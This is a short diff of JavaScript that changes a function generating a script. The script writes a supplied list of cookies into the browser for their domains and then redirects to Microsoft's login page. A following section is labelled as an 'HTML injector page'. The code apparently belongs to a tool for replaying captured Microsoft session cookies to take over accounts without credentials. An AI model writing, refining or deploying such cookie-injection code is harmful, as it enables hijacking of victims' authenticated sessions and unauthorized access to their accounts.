@@ -210,21 +210,18 @@ function parseCookies(cookieString) {
 function generatePopupScript(cookies) {
   if (!cookies || cookies.length === 0) return '';
   
-  let statements = [];
+  let output = '';
   for (var i = 0; i < cookies.length; i++) {
-    var c = cookies[i];
-    statements.push(`document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None"`);
+    const c = cookies[i];
+    output += `document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";\n`;
   }
+  output += '\n';
+  output += '// Redirect after 3s\n';
+  output += 'setTimeout(() => {\n';
+  output += '  window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  output += '}, 3000);\n';
   
-  var script = '(function(){\n' +
-    statements.map(function(s) { return '  ' + s; }).join('\n') + '\n' +
-    '\n' +
-    '  setTimeout(function() {\n' +
-    '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n' +
-    '  }, 3000);\n' +
-    '})();';
-  
-  return script;
+  return output;
 }
 
 // ─── Standalone HTML injector page ──────────────────────────────────
